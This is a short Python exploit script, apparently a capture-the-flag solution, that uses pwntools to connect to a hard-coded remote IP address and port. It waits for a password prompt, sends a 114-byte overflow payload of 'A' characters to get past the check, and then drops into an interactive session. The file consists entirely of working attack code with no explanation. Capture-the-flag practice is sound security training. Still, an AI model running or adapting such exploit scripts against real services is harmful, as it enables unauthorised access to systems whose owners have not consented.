from pwn import *
payload = "A"*110+"AAAA"

p = remote('35.240.148.138', 5001)
print(p.recvuntil('Enter password:'))
print(p.recvline())
p.sendline(payload)
print(p.recvline())
p.interactive()
